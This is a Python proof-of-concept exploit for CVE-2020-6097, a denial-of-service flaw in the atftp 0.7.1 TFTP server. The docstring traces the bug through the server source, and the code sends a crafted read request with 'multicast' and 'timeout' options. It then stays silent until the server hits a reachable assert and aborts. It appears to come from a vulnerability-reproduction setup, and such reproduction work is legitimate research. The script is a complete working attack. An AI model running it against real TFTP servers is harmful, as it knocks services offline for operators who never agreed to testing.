#!/usr/bin/env python3
"""
PoC for CVE-2020-6097 - atftp 0.7.1 atftpd reachable assert -> abort (CWE-617).

This is a DoS via a deliberate abort(), not memory corruption.  A reachable
assert -> SIGABRT still counts as an observable crash per our taxonomy.

Mechanism (verified against atftp v0.7.1 source):

  sockaddr_print_addr() (tftp_def.c:192) ends with:
      else
          assert(!"sockaddr_print: unsupported address family");   // :200

  The RFC2090 multicast path in tftpd_send_file() (tftpd_file.c) promotes the
  FIRST "multicast"-option RRQ to a master client, then deliberately zeroes the
  client's socket family so it can re-open the socket unconnected for the mcast
  group:
      sa->ss_family = AF_UNSPEC;        // sa = &data->client_info->client
      connect(sockfd, (struct sockaddr *)sa, sizeof(*sa));

  The master thread then OACKs us and loops in S_WAIT_PACKET.  If we never ACK,
  it retries NB_OF_RETRY(5) times then on the final timeout logs the client:
      logger(LOG_INFO, "client (%s) not responding",
             sockaddr_print_addr(&client_info->client, addr_str, ...));   // :271
  client_info->client is now AF_UNSPEC -> sockaddr_print_addr() hits the else
  branch -> assert(0) -> abort() (SIGABRT).

Wire sequence that works:
  1. RRQ (opcode 0x01) for "testfile" in "octet" mode, carrying the options
     "multicast"\0 (empty value -> server fills its mcast group) and
     "timeout"\0"1"\0 (shrink the retry timeout so the master aborts in ~6s
     instead of ~30s).
  2. atftpd spawns a master worker on a NEW ephemeral source port, zeroes our
     client family (AF_UNSPEC), and OACKs us from that port.
  3. We deliberately stay SILENT (never ACK).  The master retries 5x at 1s,
     then logs our AF_UNSPEC address -> assert -> abort.

Run INSIDE the container (docker exec) against 127.0.0.1:69 so the TFTP
multi-port worker reply is not lost to docker's UDP ephemeral-port remap.

Usage: poc_cve_2020_6097.py [host] [port]   (default 127.0.0.1 6902)
"""
import socket
import sys
import time

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 6902

OP_RRQ = 0x01

# RRQ: 0x0001 | "testfile"\0 "octet"\0 | "multicast"\0 ""\0 | "timeout"\0 "1"\0
rrq = (
    bytes([0x00, OP_RRQ])
    + b"testfile\x00octet\x00"
    + b"multicast\x00\x00"
    + b"timeout\x001\x00"
)

print(f"[*] Target atftpd at {host}:{port}/udp")
print(f"[*] Step 1: sending RRQ-multicast for 'testfile' ({len(rrq)} bytes)")
print(f"    payload = {rrq!r}")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(5)
s.sendto(rrq, (host, port))

worker_addr = None
try:
    data, worker_addr = s.recvfrom(4096)
    print(f"[*] Step 2: master worker OACK'd from {worker_addr} -> {data!r}")
    print("[*]         (this is the master thread; our client family is now AF_UNSPEC)")
except socket.timeout:
    print("[!] No OACK seen (worker reply may have been remapped). Continuing anyway.")

# Step 3: stay SILENT. The master retries NB_OF_RETRY(5) times at timeout=1s,
# then logs the AF_UNSPEC client -> assert -> abort. Just wait it out.
print("[*] Step 3: staying silent; waiting for master timeout -> assert(abort)...")
deadline = time.time() + 20
while time.time() < deadline:
    try:
        data, addr = s.recvfrom(4096)
        print(f"[*]   (master retransmit OACK from {addr}: {data!r}) -- ignoring")
    except socket.timeout:
        pass
    time.sleep(0.5)

s.close()
print("[*] Done. Check `docker logs` for the ASan/libc abort trace naming")
print("    sockaddr_print_addr / tftp_def.c:200 (assert) / tftpd_send_file.")
